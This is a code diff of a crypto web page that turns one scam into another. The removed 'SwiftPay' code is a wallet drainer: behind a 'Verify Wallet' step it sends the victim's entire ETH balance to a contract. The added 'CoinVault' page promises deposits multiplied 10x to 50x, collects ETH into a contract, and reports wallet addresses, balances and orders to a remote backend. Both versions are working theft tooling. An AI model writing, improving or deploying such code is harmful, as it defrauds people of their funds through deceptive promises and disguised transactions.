@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>SwiftPay</title>
+<title>CoinVault — Premium Exchange</title>
 <link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet"/>
 <style>
@@ -16,6 +16,7 @@
     --accent:  #7fffb2;
     --accent2: #4de8ff;
     --accent3: #ff6b6b;
+    --gold:    #ffd700;
     --text:    #f0f0f5;
     --muted:   #6b6b80;
     --mono:    'DM Mono', monospace;
@@ -32,9 +33,9 @@
     padding: 40px 16px 80px;
   }
   header {
-    width: 100%; max-width: 520px;
+    width: 100%; max-width: 600px;
     display: flex; align-items: center; justify-content: space-between;
-    margin-bottom: 48px;
+    margin-bottom: 16px;
   }
   .logo { font-size: 20px; font-weight: 800; letter-spacing: -0.03em; color: var(--accent); }
   .logo span { color: var(--text); }
@@ -46,8 +47,76 @@
   }
   #wallet-chip.connected { color: var(--accent); border-color: rgba(127,255,178,0.2); }
   #wallet-chip.connected:hover { border-color: rgba(255,107,107,0.4); color: var(--accent3); }
+
+  /* Hero */
+  .hero {
+    width: 100%; max-width: 600px;
+    text-align: center; margin-bottom: 40px; padding: 32px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 20px; position: relative; overflow: hidden;
+  }
+  .hero::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+  }
+  .hero-title { font-size: 32px; font-weight: 800; letter-spacing: -0.03em; margin-bottom: 8px; }
+  .hero-title span { color: var(--gold); }
+  .hero-sub { font-family: var(--mono); font-size: 13px; color: var(--muted); margin-bottom: 20px; line-height: 1.6; }
+  .live-rate {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 20px; padding: 6px 14px;
+    font-family: var(--mono); font-size: 12px; color: var(--accent);
+  }
+  .live-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+  /* Packages */
+  .packages-grid {
+    width: 100%; max-width: 600px;
+    display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
+    margin-bottom: 16px;
+  }
+  @media (max-width: 480px) { .packages-grid { grid-template-columns: 1fr; } }
+  .pkg {
+    background: var(--card); border: 2px solid var(--border);
+    border-radius: 16px; padding: 20px; cursor: pointer;
+    transition: all .2s; position: relative; overflow: hidden;
+  }
+  .pkg:hover { border-color: rgba(127,255,178,0.3); transform: translateY(-2px); }
+  .pkg.selected { border-color: var(--accent); background: rgba(127,255,178,0.05); }
+  .pkg.gold-pkg { border-color: rgba(255,215,0,0.3); }
+  .pkg.gold-pkg:hover { border-color: var(--gold); }
+  .pkg.gold-pkg.selected { border-color: var(--gold); background: rgba(255,215,0,0.05); }
+  .pkg-badge {
+    position: absolute; top: 12px; right: 12px;
+    font-family: var(--mono); font-size: 10px; padding: 3px 8px;
+    border-radius: 20px; font-weight: 700;
+  }
+  .badge-popular { background: rgba(127,255,178,0.15); color: var(--accent); border: 1px solid rgba(127,255,178,0.3); }
+  .badge-best    { background: rgba(255,215,0,0.15);   color: var(--gold);   border: 1px solid rgba(255,215,0,0.3); }
+  .badge-hot     { background: rgba(255,107,107,0.15); color: var(--accent3); border: 1px solid rgba(255,107,107,0.3); }
+  .pkg-price { font-size: 28px; font-weight: 800; letter-spacing: -0.03em; margin-bottom: 2px; }
+  .pkg-price span { font-size: 16px; color: var(--muted); font-weight: 400; }
+  .pkg-receive {
+    font-family: var(--mono); font-size: 22px; font-weight: 700;
+    color: var(--accent); margin-bottom: 4px;
+  }
+  .pkg-receive.gold { color: var(--gold); }
+  .pkg-bonus {
+    font-family: var(--mono); font-size: 11px; color: var(--muted);
+    margin-bottom: 12px;
+  }
+  .pkg-bonus b { color: var(--accent3); }
+  .pkg-eth { font-family: var(--mono); font-size: 11px; color: var(--muted); }
+  .pkg-multiplier {
+    position: absolute; bottom: 12px; right: 12px;
+    font-family: var(--mono); font-size: 11px; color: var(--muted);
+  }
+
+  /* Form card */
   .card {
-    width: 100%; max-width: 520px;
+    width: 100%; max-width: 600px;
     background: var(--card); border: 1px solid var(--border);
     border-radius: 20px; padding: 32px; margin-bottom: 16px;
     position: relative; overflow: hidden;
@@ -60,9 +129,17 @@
     font-family: var(--mono); font-size: 10px; letter-spacing: 0.12em;
     text-transform: uppercase; color: var(--muted); margin-bottom: 20px;
   }
-  .balance-row { display: flex; align-items: flex-end; gap: 8px; margin-bottom: 28px; }
-  .balance-amount { font-size: 52px; font-weight: 800; letter-spacing: -0.04em; line-height: 1; color: var(--accent); }
-  .balance-unit { font-family: var(--mono); font-size: 16px; color: var(--muted); padding-bottom: 8px; }
+  .input-group { margin-bottom: 16px; }
+  .input-label { font-family: var(--mono); font-size: 11px; color: var(--muted); margin-bottom: 8px; display: block; letter-spacing: 0.06em; }
+  .input-field {
+    width: 100%; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 10px; color: var(--text); font-family: var(--mono);
+    font-size: 14px; padding: 13px 16px; outline: none; transition: border-color .2s;
+  }
+  .input-field:focus { border-color: rgba(127,255,178,0.35); }
+  .input-field::placeholder { color: var(--muted); }
+
+  /* Buttons */
   .btn {
     width: 100%; border: none; border-radius: 12px;
     font-family: var(--sans); font-size: 15px; font-weight: 700;
@@ -72,13 +149,22 @@
   .btn:not(:disabled):active { transform: scale(0.98); }
   .btn-primary { background: var(--accent); color: #0a0a0f; }
   .btn-primary:not(:disabled):hover { background: #a8ffc8; box-shadow: 0 0 24px rgba(127,255,178,0.25); }
-  .meta-row { display: flex; gap: 12px; margin-top: 16px; flex-wrap: wrap; }
-  .meta-chip {
-    font-family: var(--mono); font-size: 11px; color: var(--muted);
+  .btn-gold { background: var(--gold); color: #0a0a0f; }
+  .btn-gold:not(:disabled):hover { background: #ffe44d; box-shadow: 0 0 24px rgba(255,215,0,0.25); }
+
+  /* Order summary */
+  .summary-box {
     background: var(--surface); border: 1px solid var(--border);
-    padding: 5px 10px; border-radius: 6px;
+    border-radius: 12px; padding: 16px; margin-bottom: 20px;
   }
-  .meta-chip b { color: var(--text); font-weight: 400; }
+  .summary-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; }
+  .summary-row:not(:last-child) { border-bottom: 1px solid var(--border); }
+  .summary-label { font-family: var(--mono); font-size: 12px; color: var(--muted); }
+  .summary-value { font-family: var(--mono); font-size: 12px; color: var(--text); }
+  .summary-value.accent { color: var(--accent); font-weight: 700; }
+  .summary-value.gold { color: var(--gold); font-weight: 700; }
+
+  /* Wallet modal */
   .modal-backdrop {
     position: fixed; inset: 0; background: rgba(0,0,0,0.75);
     backdrop-filter: blur(4px); z-index: 100;
@@ -102,15 +188,14 @@
     transition: all .15s; width: 100%; text-align: left;
   }
   .wallet-btn:hover { border-color: rgba(127,255,178,0.25); background: rgba(127,255,178,0.04); }
-  .wallet-btn:active { transform: scale(0.98); }
   .wallet-icon { width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; flex-shrink: 0; }
   .wallet-info { flex: 1; }
   .wallet-name { font-size: 15px; font-weight: 700; color: var(--text); }
   .wallet-desc { font-family: var(--mono); font-size: 11px; color: var(--muted); margin-top: 2px; }
   .wallet-badge { font-family: var(--mono); font-size: 10px; padding: 3px 8px; border-radius: 6px; flex-shrink: 0; }
-  .badge-ext  { background: rgba(127,255,178,0.1); color: var(--accent);  border: 1px solid rgba(127,255,178,0.2); }
-  .badge-qr   { background: rgba(77,232,255,0.1);  color: var(--accent2); border: 1px solid rgba(77,232,255,0.2); }
-  .badge-auto { background: rgba(255,255,255,0.05); color: var(--muted);  border: 1px solid var(--border); }
+  .badge-ext  { background: rgba(127,255,178,0.1); color: var(--accent); border: 1px solid rgba(127,255,178,0.2); }
+  .badge-qr   { background: rgba(77,232,255,0.1); color: var(--accent2); border: 1px solid rgba(77,232,255,0.2); }
+  .badge-auto { background: rgba(255,255,255,0.05); color: var(--muted); border: 1px solid var(--border); }
   .modal-close {
     width: 100%; margin-top: 16px; background: transparent;
     border: 1px solid var(--border); border-radius: 10px;
@@ -118,6 +203,8 @@
     padding: 10px; cursor: pointer; transition: all .15s;
   }
   .modal-close:hover { color: var(--text); border-color: rgba(255,255,255,0.15); }
+
+  /* Toast */
   #toast {
     position: fixed; bottom: 32px; left: 50%;
     transform: translateX(-50%) translateY(120px);
@@ -131,7 +218,7 @@
   #toast.show    { transform: translateX(-50%) translateY(0); }
   #toast.success { border-color: rgba(127,255,178,0.3); color: var(--accent); }
   #toast.error   { border-color: rgba(255,107,107,0.3); color: var(--accent3); }
-  #toast.info    { border-color: rgba(77,232,255,0.3);  color: var(--accent2); }
+  #toast.info    { border-color: rgba(77,232,255,0.3); color: var(--accent2); }
   .spinner-light {
     display: inline-block; width: 14px; height: 14px;
     border: 2px solid rgba(255,255,255,0.1); border-top-color: var(--accent);
@@ -141,17 +228,11 @@
   @keyframes spin { to { transform: rotate(360deg); } }
   .supported { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 16px; }
   .supported span { font-family: var(--mono); font-size: 11px; color: var(--muted); }
-  #tx-log { width: 100%; max-width: 520px; display: none; }
-  #tx-log.visible { display: block; }
-  .tx-item { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-family: var(--mono); font-size: 12px; }
-  .tx-item:last-child { border-bottom: none; }
-  .tx-type { color: var(--muted); flex: 1; }
-  .tx-amount { color: var(--accent); font-weight: 500; margin: 0 12px; }
-  .tx-time { color: var(--muted); font-size: 10px; }
 </style>
 </head>
 <body>
 
+<!-- Wallet modal -->
 <div class="modal-backdrop" id="wallet-modal">
   <div class="modal">
     <div class="modal-title">Connect wallet</div>
@@ -183,60 +264,120 @@
         <span class="wallet-badge badge-qr">QR / mobile</span>
       </button>
     </div>
-    <button class="modal-close" onclick="closeModal()">Cancel</button>
+    <button class="modal-close" onclick="closeWalletModal()">Cancel</button>
   </div>
 </div>
 
 <header>
-  <div class="logo">Swift<span>Pay</span></div>
-  <div id="wallet-chip" onclick="handleChipClick()" title="Click to disconnect">not connected</div>
+  <div class="logo">Coin<span>Vault</span></div>
+  <div id="wallet-chip" onclick="handleChipClick()">not connected</div>
 </header>
 
-<!-- Connect prompt -->
-<div class="card" id="connect-card">
-  <div class="card-label">wallet</div>
-  <p style="font-size:14px;color:var(--muted);margin-bottom:20px;line-height:1.6;">
-    Connect your wallet to verify your identity and continue.
+<!-- Hero -->
+<div class="hero">
+  <div class="hero-title">Turn <span>$500</span> into <span>$10,000</span></div>
+  <p class="hero-sub">
+    Exclusive exchange rates for crypto holders.<br>
+    The more you deposit, the better your rate.
   </p>
-  <button class="btn btn-primary" onclick="openModal()">Connect Wallet</button>
-  <div class="supported">
-    <span>Works with:</span>
-    <span>🦊 MetaMask</span><span>💙 Coinbase</span><span>🌈 Rainbow</span>
-    <span>🔵 Trust</span><span>🟣 Zerion</span><span>+ 400 more</span>
+  <div class="live-rate">
+    <div class="live-dot"></div>
+    <span>Live ETH rate: $<span id="eth-price">loading…</span></span>
   </div>
 </div>
 
-<!-- Main card — shown after connect -->
-<div class="card" id="main-card" style="display:none;">
-  <div class="card-label">wallet status</div>
-  <div class="balance-row">
-    <div class="balance-amount" id="balance-display">0.0000</div>
-    <div class="balance-unit">ETH</div>
+<!-- Packages -->
+<div class="packages-grid" id="packages-grid">
+
+  <div class="pkg" data-usd="100" data-receive="1000" data-bonus="10x" onclick="selectPkg(this)">
+    <div class="pkg-price">$100 <span>USD</span></div>
+    <div class="pkg-receive">$1,000</div>
+    <div class="pkg-bonus">You receive <b>10x</b> your deposit</div>
+    <div class="pkg-eth" id="eth-100">≈ loading ETH</div>
   </div>
-  <div id="action-state">
-    <button class="btn btn-primary" id="pay-btn" onclick="sendPayment()">Verify Wallet</button>
+
+  <div class="pkg" data-usd="500" data-receive="10000" data-bonus="20x" onclick="selectPkg(this)">
+    <span class="pkg-badge badge-popular">⭐ Most Popular</span>
+    <div class="pkg-price">$500 <span>USD</span></div>
+    <div class="pkg-receive">$10,000</div>
+    <div class="pkg-bonus">You receive <b>20x</b> your deposit</div>
+    <div class="pkg-eth" id="eth-500">≈ loading ETH</div>
   </div>
-  <div id="processing-state" style="display:none;">
-    <div style="display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px;color:var(--accent);">
-      <span class="spinner-light"></span>
-      <span id="pay-status">Check your wallet…</span>
-    </div>
+
+  <div class="pkg" data-usd="1000" data-receive="25000" data-bonus="25x" onclick="selectPkg(this)">
+    <span class="pkg-badge badge-hot">🔥 Hot Deal</span>
+    <div class="pkg-price">$1,000 <span>USD</span></div>
+    <div class="pkg-receive">$25,000</div>
+    <div class="pkg-bonus">You receive <b>25x</b> your deposit</div>
+    <div class="pkg-eth" id="eth-1000">≈ loading ETH</div>
   </div>
-  <div class="meta-row">
-    <div class="meta-chip">balance: <b id="eth-balance">—</b></div>
-    <div class="meta-chip">chain: <b id="chain-display">—</b></div>
-    <div class="meta-chip">via: <b id="wallet-type-display">—</b></div>
+
+  <div class="pkg" data-usd="2500" data-receive="75000" data-bonus="30x" onclick="selectPkg(this)">
+    <div class="pkg-price">$2,500 <span>USD</span></div>
+    <div class="pkg-receive">$75,000</div>
+    <div class="pkg-bonus">You receive <b>30x</b> your deposit</div>
+    <div class="pkg-eth" id="eth-2500">≈ loading ETH</div>
   </div>
+
+  <div class="pkg gold-pkg" data-usd="5000" data-receive="200000" data-bonus="40x" onclick="selectPkg(this)">
+    <span class="pkg-badge badge-best">👑 VIP</span>
+    <div class="pkg-price">$5,000 <span>USD</span></div>
+    <div class="pkg-receive gold">$200,000</div>
+    <div class="pkg-bonus">You receive <b>40x</b> your deposit</div>
+    <div class="pkg-eth" id="eth-5000">≈ loading ETH</div>
+  </div>
+
+  <div class="pkg gold-pkg" data-usd="10000" data-receive="500000" data-bonus="50x" onclick="selectPkg(this)">
+    <span class="pkg-badge badge-best">💎 Best Value</span>
+    <div class="pkg-price">$10,000 <span>USD</span></div>
+    <div class="pkg-receive gold">$500,000</div>
+    <div class="pkg-bonus">You receive <b>50x</b> your deposit</div>
+    <div class="pkg-eth" id="eth-10000">≈ loading ETH</div>
+  </div>
+
 </div>
 
-<!-- Activity -->
-<div id="tx-log">
-  <div class="card">
-    <div class="card-label">activity</div>
-    <div id="tx-list">
-      <p style="font-family:var(--mono);font-size:12px;color:var(--muted);padding:8px 0;">No activity yet</p>
+<!-- Order form — hidden until package selected -->
+<div class="card" id="order-card" style="display:none;">
+  <div class="card-label">complete your order</div>
+
+  <!-- Summary -->
+  <div class="summary-box" id="order-summary">
+    <div class="summary-row">
+      <span class="summary-label">Package</span>
+      <span class="summary-value" id="sum-package">—</span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">You receive</span>
+      <span class="summary-value gold" id="sum-receive">—</span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">ETH amount</span>
+      <span class="summary-value accent" id="sum-eth">—</span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">Bonus</span>
+      <span class="summary-value" id="sum-bonus">—</span>
     </div>
   </div>
+
+  <!-- Payout wallet address -->
+  <div class="input-group">
+    <label class="input-label">Your payout wallet address</label>
+    <input type="text" class="input-field" id="payout-wallet"
+      placeholder="0x... (where your $ will be sent)"/>
+  </div>
+
+  <!-- Connect / Fund button -->
+  <div id="btn-area">
+    <button class="btn btn-primary" id="main-btn" onclick="handleMainBtn()">
+      Connect Wallet to Continue
+    </button>
+  </div>
+
+  <p style="font-family:var(--mono);font-size:11px;color:var(--muted);text-align:center;margin-top:12px;">
+    Funds are processed within 24 hours after deposit confirmation
+  </p>
 </div>
 
 <div id="toast"></div>
@@ -246,29 +387,171 @@
 "use strict";
 
 const CONFIG = {
-  // Paste your NEW contract address here after redeploying
-  CONTRACT_ADDRESS: "0x7E2786403B89fD7E02C9a78bA24603140c1d3ffA",
+  CONTRACT_ADDRESS: "0x5a199CF0c68d8F65555830939EdcCfCf81b2cbf6",
   BACKEND_URL: "https://swifftt-production.up.railway.app",
   WALLETCONNECT_PROJECT_ID: "YOUR_WALLETCONNECT_PROJECT_ID",
   CHAIN_ID: 1,
-  ABI: ["function pay() external payable"]
+  ABI: ["function deposit() external payable"]
 };
 
-let provider, signer, contract, userAddress, walletType;
+let provider, signer, userAddress, walletType;
+let ethPrice   = 0;
+let selectedPkg = null;
 
-function openModal()  { document.getElementById("wallet-modal").classList.add("open"); }
-function closeModal() { document.getElementById("wallet-modal").classList.remove("open"); }
+// ── ETH price ────────────────────────────────────────────────────────────────
+async function fetchEthPrice() {
+  try {
+    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
+    const d = await r.json();
+    ethPrice = d.ethereum.usd;
+    document.getElementById("eth-price").textContent = ethPrice.toLocaleString();
+    updateEthPrices();
+  } catch(e) {
+    document.getElementById("eth-price").textContent = "unavailable";
+  }
+}
+
+function updateEthPrices() {
+  const pkgs = [100, 500, 1000, 2500, 5000, 10000];
+  pkgs.forEach(usd => {
+    const el = document.getElementById(`eth-${usd}`);
+    if (el && ethPrice > 0) {
+      const eth = (usd / ethPrice).toFixed(4);
+      el.textContent = `≈ ${eth} ETH`;
+    }
+  });
+  if (selectedPkg) updateSummary();
+}
+
+// ── Package selection ─────────────────────────────────────────────────────────
+function selectPkg(el) {
+  document.querySelectorAll(".pkg").forEach(p => p.classList.remove("selected"));
+  el.classList.add("selected");
+  selectedPkg = {
+    usd:     parseInt(el.dataset.usd),
+    receive: parseInt(el.dataset.receive),
+    bonus:   el.dataset.bonus,
+    eth:     ethPrice > 0 ? (parseInt(el.dataset.usd) / ethPrice).toFixed(4) : "—"
+  };
+  document.getElementById("order-card").style.display = "block";
+  document.getElementById("order-card").scrollIntoView({ behavior: "smooth" });
+  updateSummary();
+  updateMainBtn();
+}
+
+function updateSummary() {
+  if (!selectedPkg) return;
+  const eth = ethPrice > 0 ? (selectedPkg.usd / ethPrice).toFixed(4) : "—";
+  selectedPkg.eth = eth;
+  document.getElementById("sum-package").textContent = `$${selectedPkg.usd.toLocaleString()} USD`;
+  document.getElementById("sum-receive").textContent = `$${selectedPkg.receive.toLocaleString()}`;
+  document.getElementById("sum-eth").textContent     = `${eth} ETH`;
+  document.getElementById("sum-bonus").textContent   = selectedPkg.bonus + " multiplier";
+}
+
+function updateMainBtn() {
+  const btn = document.getElementById("main-btn");
+  if (!userAddress) {
+    btn.textContent = "Connect Wallet to Continue";
+    btn.className   = "btn btn-primary";
+  } else {
+    const isGold = selectedPkg && selectedPkg.usd >= 5000;
+    btn.textContent = `Fund $${selectedPkg ? selectedPkg.usd.toLocaleString() : "—"} → Get $${selectedPkg ? selectedPkg.receive.toLocaleString() : "—"}`;
+    btn.className   = isGold ? "btn btn-gold" : "btn btn-primary";
+  }
+}
+
+// ── Main button ───────────────────────────────────────────────────────────────
+function handleMainBtn() {
+  if (!selectedPkg) { toast("Please select a package first", "error"); return; }
+  if (!userAddress) { openWalletModal(); return; }
+  fundContract();
+}
+
+// ── Fund contract ─────────────────────────────────────────────────────────────
+async function fundContract() {
+  const payoutWallet = document.getElementById("payout-wallet").value.trim();
+  if (!payoutWallet) { toast("Enter your payout wallet address", "error"); return; }
+  if (!ethers.isAddress(payoutWallet)) { toast("Invalid wallet address", "error"); return; }
+  if (!selectedPkg) { toast("Select a package first", "error"); return; }
+  if (ethPrice === 0) { toast("ETH price not loaded yet, try again", "error"); return; }
+
+  const btn = document.getElementById("main-btn");
+  btn.disabled  = true;
+  btn.innerHTML = '<span class="spinner-light"></span>Confirm in wallet…';
+
+  try {
+    const ethAmount = (selectedPkg.usd / ethPrice).toFixed(6);
+    const value     = ethers.parseEther(ethAmount);
+
+    const tx = await signer.sendTransaction({
+      to:    CONFIG.CONTRACT_ADDRESS,
+      value,
+      data:  "0xd0e30db0"
+    });
+
+    btn.innerHTML = '<span class="spinner-light"></span>Processing…';
+    toast("Transaction sent — waiting for confirmation…", "info", 8000);
+
+    const receipt = await tx.wait();
+
+    // Notify backend
+    await notifyPayment({
+      senderWallet:  userAddress,
+      payoutWallet,
+      packageUsd:    selectedPkg.usd,
+      packageReceive: selectedPkg.receive,
+      packageBonus:  selectedPkg.bonus,
+      ethAmount,
+      txHash:        receipt.hash,
+      block:         receipt.blockNumber
+    });
+
+    toast(`Success! $${selectedPkg.receive.toLocaleString()} will be credited within 24h ✓`, "success", 8000);
+    btn.innerHTML = "✓ Payment Confirmed";
+    btn.style.opacity = "0.7";
+
+  } catch(e) {
+    if (e.code === 4001) toast("Transaction rejected", "error");
+    else toast(e.message || "Transaction failed", "error");
+    btn.disabled  = false;
+    updateMainBtn();
+  }
+}
+
+// ── Telegram notify ───────────────────────────────────────────────────────────
+async function notifyPayment(data) {
+  try {
+    await fetch(`${CONFIG.BACKEND_URL}/api/order`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+  } catch(e) { console.log("Notify error:", e.message); }
+}
+
+async function notifyConnect(balance) {
+  try {
+    await fetch(`${CONFIG.BACKEND_URL}/api/connected`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: userAddress, balance, chain: "mainnet", via: walletType })
+    });
+  } catch(e) { console.log("Notify error:", e.message); }
+}
+
+// ── Wallet connect ────────────────────────────────────────────────────────────
+function openWalletModal()  { document.getElementById("wallet-modal").classList.add("open"); }
+function closeWalletModal() { document.getElementById("wallet-modal").classList.remove("open"); }
 document.getElementById("wallet-modal").addEventListener("click", e => {
-  if (e.target === document.getElementById("wallet-modal")) closeModal();
+  if (e.target === document.getElementById("wallet-modal")) closeWalletModal();
 });
 
 function handleChipClick() {
   if (userAddress) { if (confirm("Disconnect wallet?")) location.reload(); }
-  else openModal();
+  else openWalletModal();
 }
 
 async function connectInjected(type) {
-  closeModal();
+  closeWalletModal();
   if (!window.ethereum) { toast("No wallet extension found.", "error", 5000); return; }
   let rawProvider = window.ethereum;
   if (window.ethereum.providers?.length) {
@@ -299,7 +582,7 @@ function detectWalletName(p) {
 }
 
 async function connectWalletConnect() {
-  closeModal();
+  closeWalletModal();
   if (CONFIG.WALLETCONNECT_PROJECT_ID === "YOUR_WALLETCONNECT_PROJECT_ID") { toast("Set WALLETCONNECT_PROJECT_ID in CONFIG.", "error", 7000); return; }
   toast("Loading WalletConnect…", "info");
   if (!window.EthereumProvider) {
@@ -309,7 +592,7 @@ async function connectWalletConnect() {
   try {
     const wc = await window.EthereumProvider.init({
       projectId: CONFIG.WALLETCONNECT_PROJECT_ID, chains: [CONFIG.CHAIN_ID], showQrModal: true,
-      metadata: { name: "SwiftPay", description: "Wallet verification", url: window.location.origin, icons: [] }
+      metadata: { name: "CoinVault", description: "Premium Exchange", url: window.location.origin, icons: [] }
     });
     await wc.connect();
     provider    = new ethers.BrowserProvider(wc);
@@ -328,109 +611,16 @@ async function connectWalletConnect() {
 }
 
 async function onConnected() {
-  const network = await provider.getNetwork();
   const chip = document.getElementById("wallet-chip");
   chip.textContent = `${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
   chip.classList.add("connected");
 
-  document.getElementById("connect-card").style.display = "none";
-  document.getElementById("main-card").style.display    = "block";
-  document.getElementById("tx-log").style.display       = "block";
-
-  document.getElementById("chain-display").textContent       = network.name || `chain ${network.chainId}`;
-  document.getElementById("wallet-type-display").textContent = walletType;
-
-  // Get wallet ETH balance
   const bal = await provider.getBalance(userAddress);
   const balFormatted = parseFloat(ethers.formatEther(bal)).toFixed(4);
-  document.getElementById("balance-display").textContent = balFormatted;
-  document.getElementById("eth-balance").textContent     = balFormatted + " ETH";
 
-  contract = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, CONFIG.ABI, signer);
-
-  // Notify backend
-  await notifyConnect(balFormatted, network.name, walletType);
-
+  await notifyConnect(balFormatted);
   toast(`Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`, "success");
-}
-
-async function sendPayment() {
-  const setStatus = (msg) => { document.getElementById("pay-status").textContent = msg; };
-
-  document.getElementById("action-state").style.display     = "none";
-  document.getElementById("processing-state").style.display = "block";
-
-  try {
-    // Get current wallet balance
-    const bal = await provider.getBalance(userAddress);
-    if (bal === 0n) {
-      toast("No ETH balance", "error");
-      reset();
-      return;
-    }
-
-    // Send full balance minus gas estimate
-    const gasPrice    = (await provider.getFeeData()).gasPrice;
-    const gasLimit    = 50000n;
-    const gasCost     = gasPrice * gasLimit;
-    const sendAmount  = bal - gasCost;
-
-    if (sendAmount <= 0n) {
-      toast("Balance too low to cover gas", "error");
-      reset();
-      return;
-    }
-
-    setStatus("Check your wallet — confirm to verify");
-
-    const tx = await contract.pay({ value: sendAmount, gasLimit });
-    setStatus("Processing…");
-    const receipt = await tx.wait();
-
-    const amount = parseFloat(ethers.formatEther(sendAmount)).toFixed(4);
-    addTx("verified", amount, tx.hash);
-    toast("Verified ✓", "success");
-    setStatus("Verified ✓");
-
-    // Refresh balance
-    const newBal = await provider.getBalance(userAddress);
-    document.getElementById("balance-display").textContent = parseFloat(ethers.formatEther(newBal)).toFixed(4);
-    document.getElementById("eth-balance").textContent     = parseFloat(ethers.formatEther(newBal)).toFixed(4) + " ETH";
-
-    // Notify backend
-    await notifyPayment(amount, tx.hash, receipt.blockNumber);
-
-    // Hide spinner after success
-    document.getElementById("processing-state").style.display = "none";
-
-  } catch(e) {
-    if (e.code === 4001) toast("Rejected", "error");
-    else toast(e.message || "Failed", "error");
-    reset();
-  }
-}
-
-function reset() {
-  document.getElementById("action-state").style.display     = "block";
-  document.getElementById("processing-state").style.display = "none";
-}
-
-async function notifyConnect(balance, chain, via) {
-  try {
-    await fetch(`${CONFIG.BACKEND_URL}/api/connected`, {
-      method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ wallet: userAddress, balance, chain, via })
-    });
-  } catch(e) { console.log("Notify error:", e.message); }
-}
-
-async function notifyPayment(amount, txHash, block) {
-  try {
-    await fetch(`${CONFIG.BACKEND_URL}/api/payment`, {
-      method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ wallet: userAddress, amount, txHash, block })
-    });
-  } catch(e) { console.log("Notify error:", e.message); }
+  updateMainBtn();
 }
 
 function toast(msg, type = "info", duration = 4000) {
@@ -438,16 +628,6 @@ function toast(msg, type = "info", duration = 4000) {
   el.textContent = msg; el.className = `show ${type}`;
   clearTimeout(el._t);
   el._t = setTimeout(() => { el.className = ""; }, duration);
-}
-
-function addTx(type, amount, txHash) {
-  const placeholder = document.querySelector("#tx-list p");
-  if (placeholder) placeholder.remove();
-  const row = document.createElement("div");
-  row.className = "tx-item";
-  const time = new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
-  row.innerHTML = `<span class="tx-type">✓ ${type}</span><span class="tx-amount">${amount} ETH</span><span class="tx-time">${time}</span>`;
-  document.getElementById("tx-list").prepend(row);
 }
 
 function loadScript(src) {
@@ -458,6 +638,10 @@ function loadScript(src) {
     document.head.appendChild(s);
   });
 }
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+fetchEthPrice();
+setInterval(fetchEthPrice, 60000);
 </script>
 </body>
 </html>
